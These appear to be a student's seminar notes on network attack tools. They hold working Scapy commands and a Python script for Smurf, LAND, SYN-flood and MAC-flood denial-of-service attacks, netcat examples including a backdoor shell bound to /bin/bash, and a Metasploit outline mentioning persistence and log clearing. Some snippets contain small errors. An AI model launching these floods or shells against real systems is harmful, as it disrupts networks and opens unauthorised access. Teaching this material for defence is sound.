
__________________________________________________________________________

Network Operations with Scapy
------------------------------

Scapy is a powerful interactive packet manipulation program.

+ Install it

# apt install scapy

+ Interective shell:

# scapy

ICMP example:

>>> x = IP()/ICMP()
>>> x.show()

>>> x.src="x.x.x.x"
>>> x.dst="x.x.x.x"

>>> x.show()
>>> send(x/"LOLOLOLOL")

+ CHECK IN WIRESHARK
_______________________________________
Send TCP Packets:
----------
>>> a = IP()
>>> b = TCP()
>>> a.src="127.0.0.1"
>>> a.dst="196.1.113.45"
>>> b.sport=53
>>> b.dport=80

>>> send((a/b), count=10)
_______________________________________

Attacks that can be performed by Scapy Packet Crafting:
`````````````````````````````````````````````````````````
1. Smurf Attack
2. LAND Attack
3. SYN Flood Attack
4. MAC Flood

1. Smurf Attack - very old attack & its closed
```````````````````````````````````````````````````````````````````````
It involves an attacker sending ICMP req(ping) to network's broadcast address(x.x.x.255). The attacker spoofs the source of the ICMP request to be th IP address of the intended victim. 

Reason: ICMP does not incluse Handshake, the destination has no way of verifying the source IP.

Now routers are pre-configured to not relay ICMP requests.

# scapy

>>> x = IP()/ICMP()
>>> x.show()

>>> x.src="victim'IP"
>>> x.dst="target'IP"

>>> x.show()
>>> send(x,loop=1)

+ CHECK IN WIRESHARK

2. LAND Attack:
````````````````DoS (Denial of Service)

Attack in which a packet is sent to a target machine with the same address ( Source Address and destination address the same).


# scapy

>>> x = IP()/TCP()
>>> x.show()

>>> x.src="victim'IP"
>>> x.dst="victim'IP"

>>> x.show()
>>> send(x,loop=1)


3. SYN Flood Attack
````````````````````
SYN flood is also known as a half-open attack. In this attack, the attacker sends multiple connection requests to perform the distributed denial of service attack.


# scapy

>>> a = IP()
>>> b = TCP()

>>> a.src="victim'IP"
>>> a.dst="victim'IP"
>>> b.flags="s"

>>> send(a/b,loop=1)


4. MAC Flood:
``````````````
# scapy

>>> a = Ether()
>>> a.src=RandMAC()
>>> a.dst="ff:ff:ff:ff:ff:ff"

>>> b = ARP()
>>> b.pdst='192.168.1.255'
>>> b.hwdst="ff:ff:ff:ff:ff:ff"

>>> send(a/b, iface="eth0", count=10, inter=.001)

OR

!/usr/bin/python3
from scapy.all import *
num = int(input("Enter the number of packets "))
interface = input("Enter the Interface ")

a = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")

b = ARP(pdst='192.168.1.255',hwdst="ff:ff:ff:ff:ff:ff")

try:
  send(a/b, iface=interface, count=num, inter=.001)

except : 
  print("Destination Unreachable ")
________________________________________________________________________
Wireshar analysis:
C:\Users\nix\Desktop\Seminar\Cyber Sec TechnoLegends Online\01 Network Sec\PCAP Forensics

________________________________________________________________________

Netcat:
```````
1. To start listening on a port:
--------------------------------

Terminal 1:

# nc -l -p 8080

Terminal 2:

# nc 127.0.0.1 8080

2. To transfer data
-------------------

Terminal 1:

# nc -l -p 8080 > data.txt

Terminal 2:

# nc 127.0.0.1 8080 -vv < send.txt

3. To perform Port Scanning:
----------------------------

# nc -z -v 127.0.0.1 80
# nc -z -v 127.0.0.1 80 443
# nc -z -v 127.0.0.1 80-100


4. To send an HTTP Request:
---------------------------

# nc demo2server.in 80
GET /robots.txt HTTP/1.1
Host: demo2server.in

5. Launching Reverse (Backdoor) Shells:
---------------------------------------

Terminal 1:

# nc -n -v -lp 5555 -e /bin/bash

Terminal 2:

# nc -nv 127.0.0.1 5555

6. connection to UDP:
---------------------

Terminal 1:

# nc -u -lvp 53

7. Basic Web Server:
--------------------

# while : ; do (echo -ne "HTTP/1.1 200 OK\r\n"; cat index.html;) | nc -l -p 8080 ; done

8. Keep-Alive:
--------------
# nc -k -lp 8080

________________________________________________________________________________________
[+] Metasploit Framework
-------------------------
a) Android 
b) Linux/Unix 
c) Web Server
d) Windows 

# msfconsole -r file.rc

-> Exploit
-> Payloads
-> meterpreter
-> persistance [maintaning access]
-> covering tracks [ clear logs, clear timestamps ]
________________________________________________________________________________________

BACKUP:
-------
________________________________________________________________________________________

++++++++++++++++++++++++++++++++++++++++++++++++++++++



































































